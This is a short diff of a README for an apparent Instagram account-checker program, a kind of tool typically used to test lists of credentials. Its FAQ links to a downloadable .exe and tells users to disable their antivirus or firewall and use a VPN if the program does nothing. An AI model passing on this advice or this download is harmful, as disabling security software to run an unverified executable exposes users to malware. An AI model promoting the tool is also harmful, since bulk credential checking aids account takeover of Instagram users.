@@ -13,6 +13,7 @@
 7.After stopping the program, there is an option to save the remaining lines for verification by clicking "Save remaining lines."
 
 Possible Questions:
+
 1.Where can I get the checker program? Look for it in the "Releases" section: Releases. https://github.com/basesof/Instagram-Checker/releases/download/instagram/InstagramChecker.exe
 
 2.Why does nothing happen when I click the Start button? Your antivirus or firewall may be blocking requests. Try disabling it and also consider using a VPN.
